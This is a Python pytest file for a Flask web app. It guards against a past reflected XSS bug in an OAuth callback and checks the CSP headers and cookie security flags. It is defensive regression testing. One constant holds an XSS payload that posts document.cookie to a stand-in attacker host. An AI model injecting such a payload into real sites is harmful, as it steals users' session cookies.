"""
The OAuth callback used to echo its `error`/`error_description` query parameters back as raw HTML,
so a link to /authorized/?error=<script>... ran script on this app's origin. These tests make sure
it stays escaped, and that the cookie flags and Content-Security-Policy that limit what an injected
script could do stay in place.
"""
import flask
import pytest
from flask_login import login_user

import config
from server import app as flask_app
from server.models import db, User

PAYLOAD = '<img src=x onerror="fetch(\'https://evil.example\', {method: \'POST\', body: document.cookie})">'
ESCAPED_PAYLOAD = ('&lt;img src=x onerror=&#34;fetch(&#39;https://evil.example&#39;, '
                   '{method: &#39;POST&#39;, body: document.cookie})&#34;&gt;')


@pytest.mark.parametrize('query_string', [
    {'error': 'access_denied', 'error_description': PAYLOAD},
    {'error': PAYLOAD},  # with no description the error itself is shown
])
def test_oauth_error_is_escaped(client, query_string):
    response = client.get('/authorized/', query_string=query_string)
    assert response.status_code == 403
    page = response.get_data(as_text=True)
    assert page == 'Access denied: ' + ESCAPED_PAYLOAD
    assert '<img' not in page


@pytest.mark.parametrize('path', ['/', '/authorized/?error=access_denied', '/static/js/utils.js'])
def test_every_response_has_a_content_security_policy(client, path):
    response = client.get(path)
    policy = dict(directive.split(' ', 1) for directive in response.headers['Content-Security-Policy'].split('; '))
    # an injected script cannot fetch() or load an image from another site to hand it data
    assert policy['connect-src'] == "'self'"
    assert policy['img-src'] == "'self' data:"
    # browsers apply form-action to the redirects after a post too, and a post made once the Canvas
    # token has expired is redirected to Canvas to log in again
    assert 'form-action' not in policy
    # ...and cannot pull in script from anywhere else
    assert policy['script-src'].split()[0] == "'self'"
    assert 'https:' not in policy['script-src'] and '*' not in policy['script-src']
    assert response.headers['X-Content-Type-Options'] == 'nosniff'


def test_session_and_remember_cookies_are_http_only_and_lax(seeded_db):
    with flask_app.test_request_context('/'):
        login_user(db.session.get(User, 1), remember=True)
        response = flask_app.process_response(flask.Response())
    cookies = {header.split('=', 1)[0]: header for header in response.headers.getlist('Set-Cookie')}
    assert set(cookies) == {'session', 'remember_token'}
    for header in cookies.values():
        # HttpOnly keeps them out of document.cookie
        assert '; HttpOnly' in header
        assert '; SameSite=Lax' in header


@pytest.mark.parametrize('config_class', [config.StagingConfig, config.ProductionConfig])
def test_https_deployments_only_send_cookies_over_https(config_class):
    assert config_class.SESSION_COOKIE_SECURE is True
    assert config_class.REMEMBER_COOKIE_SECURE is True
